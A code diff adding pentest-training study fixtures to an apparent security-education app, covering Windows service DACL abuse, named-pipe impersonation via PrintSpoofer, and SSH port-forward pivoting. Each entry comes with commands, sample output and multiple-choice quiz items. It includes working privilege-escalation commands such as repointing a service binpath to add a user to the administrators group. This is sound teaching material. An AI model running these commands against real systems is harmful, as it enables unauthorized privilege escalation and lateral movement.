@@ -6288,6 +6288,321 @@
         "linux-kernel-exploit": "A kernel bug is a fallback; the mounted token is a cleaner, intended-path escape to the node.",
         "docker-socket": "That is the right idea when a docker.sock is mounted; here the lever is the Kubernetes token, so query the API."
       }
+    },
+    "windows-service-dacl-abuse": {
+      "why": "Service permissions come in grades, and you do not need full control to win. If the service's security descriptor grants your user just SERVICE_CHANGE_CONFIG, you can rewrite what it runs or which account it runs as, even without the right to stop or start it. The catch is triggering the restart: an auto-start service picks up your change on the next reboot, and some services expose a start you are allowed to call. accesschk reads the descriptor in plain terms, so you can tell this granular right apart from the broader full-access case other moves cover. Back up the original binpath first, so the box still works after you capture proof.",
+      "cmd": "accesschk.exe /accepteula -uwcqv bob VulnSvc",
+      "tool": "accesschk",
+      "output": "RW VulnSvc\n        SERVICE_QUERY_STATUS\n        SERVICE_QUERY_CONFIG\n        SERVICE_CHANGE_CONFIG\n        SERVICE_INTERROGATE\n        READ_CONTROL",
+      "signal": "SERVICE_CHANGE_CONFIG",
+      "teach": "Your user holds SERVICE_CHANGE_CONFIG on VulnSvc even without SERVICE_START or SERVICE_STOP. Repoint its binpath, or change its run-as account to LocalSystem, and let the next auto-start or reboot run your command as the service account.",
+      "leadup": [
+        {
+          "key": "service",
+          "label": "A non-default service runs with high privilege",
+          "steps": [
+            {
+              "title": "Find the service and its account",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sc qc VulnSvc",
+              "out": "SERVICE_START_NAME   : LocalSystem",
+              "sig": "SERVICE_START_NAME   : LocalSystem",
+              "teach": "A third-party service running as LocalSystem is the prize; now check what rights your user holds on it."
+            }
+          ]
+        },
+        {
+          "key": "dacl",
+          "label": "Its DACL grants you config rights",
+          "steps": [
+            {
+              "title": "Read the rights you hold",
+              "tool": "accesschk",
+              "where": "target",
+              "cmd": "accesschk.exe /accepteula -uwcqv bob VulnSvc",
+              "out": "RW VulnSvc\n        SERVICE_CHANGE_CONFIG",
+              "sig": "SERVICE_CHANGE_CONFIG",
+              "teach": "SERVICE_CHANGE_CONFIG is enough on its own; you can reconfigure the service even without stop or start rights."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Service DACL abuse is read the descriptor, confirm SERVICE_CHANGE_CONFIG, repoint what the service runs, then trigger a start you can reach.",
+        "items": [
+          {
+            "t": "Find a service and its account",
+            "d": "sc qc shows the run-as account and current binary path. You want a service running as LocalSystem or an admin.",
+            "demo": [
+              {
+                "run": "sc qc VulnSvc",
+                "out": "SERVICE_START_NAME   : LocalSystem",
+                "sig": "LocalSystem"
+              }
+            ],
+            "note": "Note the current binpath so you can restore it afterward."
+          },
+          {
+            "t": "Read the service DACL",
+            "d": "accesschk with -uwcqv names the exact rights your user holds on the service object, so you can spot the granular config right.",
+            "demo": [
+              {
+                "run": "accesschk.exe /accepteula -uwcqv bob VulnSvc",
+                "out": "        SERVICE_CHANGE_CONFIG",
+                "sig": "SERVICE_CHANGE_CONFIG"
+              }
+            ],
+            "note": "This right is enough even when you cannot stop or start the service."
+          },
+          {
+            "t": "Repoint the binary path",
+            "d": "sc config rewrites the binpath, or obj= changes the account it runs as. Keep a copy of the original value.",
+            "demo": [
+              {
+                "run": "sc config VulnSvc binPath= \"cmd /c net localgroup administrators bob /add\"",
+                "out": "[SC] ChangeServiceConfig SUCCESS",
+                "sig": "SUCCESS"
+              }
+            ],
+            "note": "obj= LocalSystem works the same way when it is the account, not the binary, you want to change."
+          },
+          {
+            "t": "Trigger the start and confirm",
+            "d": "Fire the service if you are allowed, or wait for its auto-start or a reboot, then check your new rights.",
+            "demo": [
+              {
+                "run": "sc start VulnSvc & net localgroup administrators",
+                "out": "Administrator\nbob",
+                "sig": "bob"
+              }
+            ],
+            "note": "Your account in the administrators group confirms it; log in fresh to use the rights."
+          }
+        ]
+      },
+      "situation": "accesschk shows your user has SERVICE_CHANGE_CONFIG on a LocalSystem service, but not SERVICE_STOP or SERVICE_START. What is the move?",
+      "choices": [
+        "windows-service-dacl-abuse",
+        "weak-service-permissions",
+        "unquoted-service-path",
+        "windows-enum"
+      ],
+      "coach": {
+        "weak-service-permissions": "That move assumes you can reconfigure and restart at will; here you hold only the config right, so you repoint it and wait for an auto-start or reboot.",
+        "unquoted-service-path": "The binary path is quoted, so there is no space to hijack; the lever is the writable DACL on the service object.",
+        "windows-enum": "You already found the weak DACL; now reconfigure the service and trigger it."
+      }
+    },
+    "windows-namedpipe-impersonation": {
+      "why": "Windows lets a server borrow the identity of a client that connects to it, which is normally how a service acts on a user's behalf. You can turn that against the box: stand up a named pipe, get a more privileged process to connect to it, then call the impersonation API to adopt its token and duplicate it into a new process. The classic shortcut is SeImpersonatePrivilege plus a potato tool, which coerces a SYSTEM service onto your pipe for you. Even without that privilege, any service or task you can point at your pipe path hands you its token when it connects, so the coercion, not the privilege, is the real requirement.",
+      "cmd": "whoami /priv",
+      "tool": "cmd",
+      "output": "PRIVILEGES INFORMATION\n----------------------\n\nPrivilege Name                Description                               State\n============================= ========================================= =======\nSeImpersonatePrivilege        Impersonate a client after authentication Enabled",
+      "signal": "SeImpersonatePrivilege",
+      "teach": "SeImpersonatePrivilege makes this a one-tool job with a potato, which spins up the pipe and coerces a SYSTEM service onto it. Without the privilege, coerce a service or task you control onto a pipe you created, then impersonate the token it presents.",
+      "leadup": [
+        {
+          "key": "priv",
+          "label": "Your token carries SeImpersonate",
+          "steps": [
+            {
+              "title": "Check your privileges",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "whoami /priv",
+              "out": "SeImpersonatePrivilege        Impersonate a client after authentication Enabled",
+              "sig": "SeImpersonatePrivilege",
+              "teach": "With this privilege a potato tool automates the pipe and the coercion for you."
+            }
+          ]
+        },
+        {
+          "key": "coerce",
+          "label": "A privileged client you can point at a pipe",
+          "steps": [
+            {
+              "title": "Find a LocalSystem service you can steer",
+              "tool": "cmd",
+              "where": "target",
+              "cmd": "sc qc VulnSvc",
+              "out": "SERVICE_START_NAME   : LocalSystem",
+              "sig": "LocalSystem",
+              "teach": "A service that runs as LocalSystem and will connect where you tell it hands over its token, even with no special privilege of yours."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "Named-pipe impersonation is create the pipe, coerce a privileged client onto it, impersonate the token it presents, then duplicate it into a SYSTEM process.",
+        "items": [
+          {
+            "t": "Check your token",
+            "d": "whoami /priv tells you whether SeImpersonate is present, which decides whether a potato does the work for you.",
+            "demo": [
+              {
+                "run": "whoami /priv",
+                "out": "SeImpersonatePrivilege        Impersonate a client after authentication Enabled",
+                "sig": "SeImpersonatePrivilege"
+              }
+            ],
+            "note": "Enabled means a potato tool is the fast path; absent means you coerce a client yourself."
+          },
+          {
+            "t": "Stand up the pipe server",
+            "d": "A helper (a potato, or your own small server) creates a named pipe and waits for a client to connect.",
+            "demo": [
+              {
+                "run": "PrintSpoofer64.exe -i -c cmd",
+                "out": "[+] Found privileged process, named pipe listening",
+                "sig": "named pipe listening"
+              }
+            ],
+            "note": "The pipe name is what the privileged client must be steered toward."
+          },
+          {
+            "t": "Coerce a privileged client",
+            "d": "Point a service, scheduled task, or the spooler at your pipe so a SYSTEM process connects to it.",
+            "demo": [
+              {
+                "run": "sc config VulnSvc binPath= \"cmd /c echo x > \\\\.\\pipe\\obol\" & sc start VulnSvc",
+                "out": "[SC] ChangeServiceConfig SUCCESS",
+                "sig": "SUCCESS"
+              }
+            ],
+            "note": "The service connects to your pipe when it starts, presenting its token."
+          },
+          {
+            "t": "Impersonate and confirm",
+            "d": "After ImpersonateNamedPipeClient and DuplicateTokenEx, spawn a process with the captured token and check who you are.",
+            "demo": [
+              {
+                "run": "whoami",
+                "out": "nt authority\\system",
+                "sig": "system"
+              }
+            ],
+            "note": "A SYSTEM result confirms the impersonation; capture proof."
+          }
+        ]
+      },
+      "situation": "You have a Windows foothold without SeImpersonate, but you can reconfigure a LocalSystem service to connect to a pipe you create. What is the move?",
+      "choices": [
+        "windows-namedpipe-impersonation",
+        "seimpersonate",
+        "unquoted-service-path",
+        "windows-enum"
+      ],
+      "coach": {
+        "seimpersonate": "That path needs SeImpersonate, which you do not hold here; the pipe works because the client connects to you and hands over its token regardless.",
+        "unquoted-service-path": "No unquoted path is in play; the lever is the privileged client you steer onto your pipe.",
+        "windows-enum": "You already have the lead; create the pipe and coerce the client onto it."
+      }
+    },
+    "pivot-ssh-portforward": {
+      "why": "A SOCKS proxy is the general answer to pivoting, but it is more machinery than a single internal service needs. SSH already carries two surgical forwards. A local forward binds a port on your own box to one internal host and port reached from the foothold, so your tools connect to localhost and land inside. A remote forward goes the other way, publishing a port of your attacker box on the foothold, which is how you catch a callback when the internal host cannot route back to you. Both ride a session you already have, so nothing new touches the target, and each exposes exactly the one port you name.",
+      "cmd": "curl -s -I http://127.0.0.1:8080",
+      "tool": "curl",
+      "output": "HTTP/1.1 200 OK\nServer: Apache/2.4.41 (Ubuntu)\nContent-Type: text/html",
+      "signal": "HTTP/1.1 200 OK",
+      "teach": "After ssh -L 8080:172.16.5.10:80, your localhost:8080 reaches the internal web server through the foothold, and a single curl confirms the forward is live. Use -R instead when the internal host must call back to you.",
+      "leadup": [
+        {
+          "key": "sshaccess",
+          "label": "You can log in over SSH",
+          "steps": [
+            {
+              "title": "Confirm the SSH session",
+              "tool": "ssh",
+              "where": "local",
+              "cmd": "ssh bob@10.10.10.10 id",
+              "out": "uid=1000(bob) gid=1000(bob) groups=1000(bob)",
+              "sig": "uid=1000(bob)",
+              "teach": "A working SSH session is the carrier; the forwards ride it with no extra tooling on the box."
+            }
+          ]
+        },
+        {
+          "key": "target",
+          "label": "You know one internal host and port",
+          "steps": [
+            {
+              "title": "Spot the internal service",
+              "tool": "ssh",
+              "where": "local",
+              "cmd": "ssh bob@10.10.10.10 'ss -tnl'",
+              "out": "LISTEN 0 128 0.0.0.0:22\nLISTEN 0 70 172.16.5.10:3306",
+              "sig": "172.16.5.10:3306",
+              "teach": "One internal service is all a forward needs; name that host and port."
+            }
+          ]
+        }
+      ],
+      "how": {
+        "lead": "SSH port forwarding is pick the one internal service, open -L for inbound reach or -R for a callback, then use the forwarded port on localhost.",
+        "items": [
+          {
+            "t": "Pick the one internal service",
+            "d": "From the foothold's routes or listeners you already have an internal host and port; a single forward is enough when you do not need the whole subnet.",
+            "demo": [
+              {
+                "run": "ssh bob@10.10.10.10 'ss -tnl | grep 172.16'",
+                "out": "LISTEN 0 70 172.16.5.10:3306",
+                "sig": "172.16.5.10:3306"
+              }
+            ],
+            "note": "That one service is the target; no proxy needed."
+          },
+          {
+            "t": "Local forward (-L) for inbound reach",
+            "d": "ssh -L binds a local port to the internal host and port through the foothold; -N runs no remote command, just the tunnel.",
+            "demo": [
+              {
+                "run": "ssh -L 3306:172.16.5.10:3306 -N bob@10.10.10.10",
+                "out": "(no output; 127.0.0.1:3306 now reaches the internal database)",
+                "sig": "127.0.0.1:3306"
+              }
+            ],
+            "note": "Connect your client to 127.0.0.1:3306 and you are inside."
+          },
+          {
+            "t": "Remote forward (-R) for a callback",
+            "d": "ssh -R publishes a port of your attacker box on the foothold, so an internal host that cannot route to you reaches your listener instead.",
+            "demo": [
+              {
+                "run": "ssh -R 9001:127.0.0.1:9001 -N bob@10.10.10.10",
+                "out": "(no output; the foothold now forwards its 9001 to your 9001)",
+                "sig": "9001"
+              }
+            ],
+            "note": "Point the internal callback at the foothold's 9001."
+          },
+          {
+            "t": "Use the forwarded service",
+            "d": "Hit the forwarded port on localhost; the traffic tunnels through SSH to the internal service.",
+            "demo": [
+              {
+                "run": "curl -s -I http://127.0.0.1:8080",
+                "out": "HTTP/1.1 200 OK",
+                "sig": "200 OK"
+              }
+            ],
+            "note": "A 200 from localhost confirms the forward carries traffic."
+          }
+        ]
+      },
+      "situation": "The foothold can reach an internal database on 172.16.5.10:3306, you have SSH on the foothold, and you only need that one service. What is the move?",
+      "choices": [
+        "pivot-ssh-portforward",
+        "pivot-ssh-dynamic",
+        "pivot-chisel-socks",
+        "pivot-scan-through"
+      ],
+      "coach": {
+        "pivot-ssh-dynamic": "A dynamic SOCKS proxy works too, but a single -L forward is simpler when you want just one port, not the whole subnet.",
+        "pivot-chisel-socks": "Chisel is for when SSH is unavailable or you need a full proxy; here SSH gives you the forward directly.",
+        "pivot-scan-through": "That scans through a SOCKS proxy you have not built; for one known service, forward it directly instead."
+      }
     }
   };
   Object.keys(GAPFILL5G).forEach(function (k) { OBOL.STUDY_FIXTURES[k] = GAPFILL5G[k]; });
